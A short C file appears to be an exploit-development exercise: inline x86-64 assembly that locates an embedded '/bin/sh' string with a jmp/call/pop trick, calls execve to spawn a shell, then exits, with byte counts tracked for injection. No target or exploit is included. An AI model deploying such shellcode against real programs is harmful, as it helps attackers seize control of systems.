#include <stdio.h>

void main()
{
__asm__ (
		"jmp .+0x29;"				// 2 bytes
		"pop %rbx;"					// 1 byte
		"mov %rbx, 0x8(%rbx);"		// 4 bytes
		"xorq %rax, %rax;"			// 3 bytes
		"movb %ah, 0x7(%rbx);"		// 3 bytes
		"movq %rax, 0x10(%rbx);"	// 4 bytes
		"mov %eax, %edx;"			// 2 bytes
		"movb $0x3b, %al;"			// 2 bytes
		"mov 0x8(%rbx), %rdi;"		// 4 bytes
		"lea 0x8(%rbx), %rsi;"		// 4 bytes
		"syscall;"					// 2 bytes
		"xorq %rcx, %rcx;"			// 3 bytes
		"mov %rcx, %rdi;"			// 3 bytes
		"movb $0x3c, %al;"			// 2 bytes
		"syscall;"					// 2 bytes
		"call .-0x27;"				// 5 bytes
		".string \"/bin/sh                 \";"
);
}
